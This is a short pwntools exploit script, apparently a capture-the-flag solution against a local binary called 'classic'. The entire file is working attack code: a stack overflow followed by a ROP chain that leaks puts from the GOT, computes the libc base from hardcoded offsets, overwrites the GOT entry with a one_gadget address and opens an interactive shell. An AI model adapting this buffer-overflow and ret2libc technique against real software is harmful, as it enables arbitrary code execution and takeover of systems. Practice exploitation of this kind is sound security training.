from pwn import *

target = process("./classic")

# address
puts_plt = 0x400520
puts_got = 0x601018
gets_plt = 0x400560

pop_rdi = 0x400753

libc_puts_off = 0x80a30
libc_system_off = 0x4f4e0

one_gadget_off = 0x10a45c

# payload 
payload = b"A" * 72
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)

payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(gets_plt)

payload += p64(puts_plt)
payload += b"B" * 8

_ = target.readuntil(">> ")
target.sendline(payload)
_ = target.readline()

temp = target.recvline()
print(temp)
libc_puts_addr = u64(temp[:-1] + b"\x00\x00")
print("libc_puts_addr : 0x{:x}\n".format(libc_puts_addr))

libc_base_addr = libc_puts_addr - libc_puts_off

print("libc_base_addr : 0x{:x}\n".format(libc_base_addr))

one_gadget_addr = libc_base_addr + one_gadget_off

print("onegadget_addr : 0x{:x}\n".format(one_gadget_addr))

target.sendline(p64(one_gadget_addr))


target.interactive()
